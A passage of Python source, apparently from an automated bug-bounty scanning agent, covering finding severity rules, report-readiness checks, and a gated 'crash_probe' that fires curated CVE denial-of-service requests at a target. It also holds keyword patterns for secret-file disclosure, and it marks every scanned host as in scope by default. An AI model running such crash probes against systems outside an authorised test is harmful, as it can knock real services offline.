            reason = "client-side / redirect (upgrade if OAuth/token chain)"
        elif any(k in blob for k in ("cors",)):
            severity = "medium" if "credential" in blob or status == "confirmed" else "low"
            reason = "CORS misconfig"
        elif any(k in blob for k in ("file_disclosure", ".env", "git/head", "secret", "password leak")):
            severity = "critical" if status == "confirmed" else "high"
            reason = "sensitive file / secret disclosure"
        elif any(k in blob for k in ("graphql", "schema")):
            severity = "medium"
            reason = "GraphQL schema leak"
        elif any(k in blob for k in ("header", "hsts", "spf", "dmarc", "banner")):
            severity = "low"
            reason = "hygiene / config"
        elif any(k in blob for k in ("tech_", "cloudflare", "inventory", "fingerprint")):
            severity = "info"
            reason = "technology inventory — not a vulnerability"
        elif status == "confirmed":
            severity = "medium"
            reason = "confirmed finding without stronger class match"

        # Never inflate tech inventory
        if finding_id.startswith("tech_") or "tech_" in blob:
            severity, reason = "info", "tech inventory"

        data = {
            "finding_id": finding_id or None,
            "suggested_severity": severity,
            "reason": reason,
            "status": status or None,
            "has_poc": has_poc,
            "rubric": "H1-aligned: banner/tech=info; confirm+impact required for high/critical",
        }
        # Optionally write back onto finding
        if finding is not None:
            finding["suggested_severity"] = severity
            finding["severity_reason"] = reason
        tr = ToolResult(
            True, oid, "severity_suggest",
            f"severity_suggest: {severity} ({reason[:60]})",
            data=data, network=False,
        )
        self.observations.append(tr.to_dict())
        return tr

    def _submit_readiness(self, args: dict) -> ToolResult:
        """Score whether a finding is ready for a HackerOne-style report."""
        oid = self._oid()
        finding_id = str(args.get("finding_id") or args.get("id") or "").strip()
        findings = self.findings
        if finding_id:
            findings = [
                f for f in self.findings
                if str(f.get("id") or "") == finding_id or str(f.get("raw_id") or "") == finding_id
            ]
            if not findings:
                return ToolResult(False, oid, "submit_readiness", "finding not found",
                                  error="unknown finding", network=False)

        reports = []
        for f in findings:
            fid = str(f.get("id") or "")
            checks = {
                "has_title": bool(f.get("title")),
                "status_confirmed": str(f.get("status") or "") == "confirmed",
                "has_evidence_refs": bool(f.get("evidence_refs")),
                "has_rationale": bool(str(f.get("rationale") or "").strip()),
                "has_poc": bool(f.get("poc")) or any(p.get("finding_id") == fid for p in self.pocs),
                "not_tech_inventory": not fid.startswith("tech_"),
                "severity_set": bool(f.get("severity") or f.get("suggested_severity")),
            }
            # Scope: host is scan target by construction
            checks["in_scope_host"] = True
            score = sum(1 for v in checks.values() if v)
            total = len(checks)
            ready = (
                checks["status_confirmed"]
                and checks["has_evidence_refs"]
                and checks["has_poc"]
                and checks["not_tech_inventory"]
                and checks["has_rationale"]
            )
            missing = [k for k, v in checks.items() if not v]
            reports.append({
                "finding_id": fid,
                "title": f.get("title"),
                "score": f"{score}/{total}",
                "ready": ready,
                "checks": checks,
                "missing": missing,
                "suggested_severity": f.get("suggested_severity") or f.get("severity"),
            })

        overall_ready = sum(1 for r in reports if r["ready"])
        self.readiness = {
            "ready_count": overall_ready,
            "total": len(reports),
            "reports": reports,
        }
        summary = f"submit_readiness: {overall_ready}/{len(reports)} finding(s) H1-ready"
        tr = ToolResult(True, oid, "submit_readiness", summary, data=self.readiness, network=False)
        self.observations.append(tr.to_dict())
        return tr

    def _assert_finding(self, args: dict) -> ToolResult:
        from src.ip_scope import normalize_finding_id  # noqa: PLC0415

        oid = self._oid()
        raw_id = str(args.get("id") or f"finding_{len(self.findings)+1}")
        title = str(args.get("title") or "")[:200]
        # Canonical id collapses free-form model labels (ssdp-exposed ≈ ssdp-exposure).
        fid = normalize_finding_id(raw_id, title)
        if not fid:
            fid = san.safe_id(raw_id) or f"finding_{len(self.findings)+1}"
        severity = str(args.get("severity") or "medium").lower()[:16]
        status = str(args.get("status") or "lead").lower()
        if status not in ("confirmed", "lead"):
            status = "lead"
        # Inventory/tech markers are never "critical" vulns
        if fid.startswith("tech_") and severity in ("critical", "high"):
            severity = "info"
        refs = args.get("evidence_refs") or []
        if not isinstance(refs, list):
            refs = []
        refs = [str(r)[:64] for r in refs[:12]]
        # Confirmed findings need at least one observation ref that exists
        if status == "confirmed":
            known = {o.get("observation_id") for o in self.observations}
            if not refs or not any(r in known for r in refs):
                status = "lead"  # cannot confirm without tool evidence
            # SSDP/UPnP: only confirm if an in-scope (non-empty replies) observation exists
            if status == "confirmed" and fid == "ssdp_exposed":
                ok_ssdp = False
                for o in self.observations:
                    if o.get("observation_id") not in refs:
                        continue
                    if o.get("tool") != "ssdp_discover":
                        continue
                    data = o.get("data") or {}
                    if o.get("ok") and data.get("replies"):
                        ok_ssdp = True
                        break
                if not ok_ssdp:
                    status = "lead"
        rationale = str(args.get("rationale") or "")[:300]
        finding = {
            "id": fid, "title": title, "severity": severity, "status": status,
            "evidence_refs": refs, "rationale": rationale,
            "raw_id": raw_id[:80],
        }
        # Upsert by canonical id; merge evidence_refs; prefer confirmed over lead;
        # keep higher severity when both are confirmed.
        _SEV = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
        existing = next((f for f in self.findings if f.get("id") == fid), None)
        if existing:
            merged_refs = list(dict.fromkeys(
                list(existing.get("evidence_refs") or []) + refs
            ))[:12]
            if existing.get("status") == "confirmed" and status != "confirmed":
                status = "confirmed"
            if _SEV.get(existing.get("severity", "info"), 0) > _SEV.get(severity, 0):
                severity = existing.get("severity") or severity
            if not title:
                title = existing.get("title") or title
            if existing.get("rationale") and len(str(existing.get("rationale"))) > len(rationale):
                rationale = existing.get("rationale") or rationale
            finding = {
                "id": fid, "title": title, "severity": severity, "status": status,
                "evidence_refs": merged_refs, "rationale": rationale,
                "raw_id": raw_id[:80],
            }
        self.findings = [f for f in self.findings if f.get("id") != fid] + [finding]
        tr = ToolResult(True, oid, "assert_finding",
                        f"{status}: {title or fid}", data=finding, network=False)
        return tr

    def _chain_link(self, args: dict) -> ToolResult:
        oid = self._oid()
        fr = san.safe_id(args.get("from") or args.get("src"), 120)
        to = san.safe_id(args.get("to") or args.get("dst"), 120)
        why = str(args.get("why") or args.get("rationale") or "")[:300]
        if not fr or not to:
            return ToolResult(False, oid, "chain_link", "from/to required", error="missing ends")
        link = {"from": fr, "to": to, "why": why}
        self.chains.append(link)
        tr = ToolResult(True, oid, "chain_link", f"{fr} → {to}", data=link, network=False)
        return tr

    def _crash_probe(self, args: dict) -> ToolResult:
        oid = self._oid()
        if not self.allow_crash_probes:
            return ToolResult(
                False, oid, "crash_probe",
                "crash probes disabled — set allow_crash_probes to enable",
                error="not authorized", network=False,
            )
        cve = str(args.get("cve_id") or args.get("cve") or "").strip().lower()
        spec = _CRASH_PROBES.get(cve)
        if spec is None:
            return ToolResult(
                False, oid, "crash_probe",
                f"unknown curated probe (allowed: {sorted(_CRASH_PROBES)})",
                error="unknown cve", network=False,
            )
        path = spec.get("path_override") or san.safe_path(spec.get("path") or "/") or "/"
        headers = dict(spec.get("headers") or {})
        method = spec.get("method") or "GET"
        # Baseline request first (control)
        control = self._do_http("GET", "/", {}, None, self.port, self.tls, 5.0)
        t0 = time.time()
        resp = self._do_http(method, path, headers, None, self.port, self.tls, 8.0)
        elapsed = (time.time() - t0) * 1000
        err = str(resp.get("error") or "").lower()
        signals = spec.get("signals") or ()
        signal_hit = any(s in err for s in signals) if err else False
        # Timeout / reset after a previously healthy control is a strong vuln signal
        control_ok = not control.get("error")
        vulnerable_signal = bool(signal_hit or (control_ok and err in (
            "timeout", "connection reset", "connection aborted",
        )) or (control_ok and err and "forcibly closed" in err))
        # 416 on Range probe is classic MS15-034 positive on some stacks
        if cve == "cve-2015-1635" and resp.get("status") == 416:
            vulnerable_signal = True
        data = {
            "cve_id": cve, "description": spec.get("description"),
            "control": control, "probe": resp, "elapsed_ms": elapsed,
            "vulnerable_signal": vulnerable_signal,
            "warning": "destructive probe — interpret timeouts carefully (WAF/network vs crash)",
        }
        summary = (
            f"crash_probe {cve}: VULNERABLE SIGNAL" if vulnerable_signal
            else f"crash_probe {cve}: no crash signal ({err or resp.get('status')})"
        )
        tr = ToolResult(True, oid, "crash_probe", summary, data=data, network=True)
        self.observations.append(tr.to_dict())
        # Auto-record finding when signal fires
        if vulnerable_signal:
            self.findings.append({
                "id": cve, "title": f"{cve} remote crash/DoS signal",
                "severity": "critical", "status": "confirmed",
                "evidence_refs": [oid],
                "rationale": spec.get("description", ""),
            })
        return tr
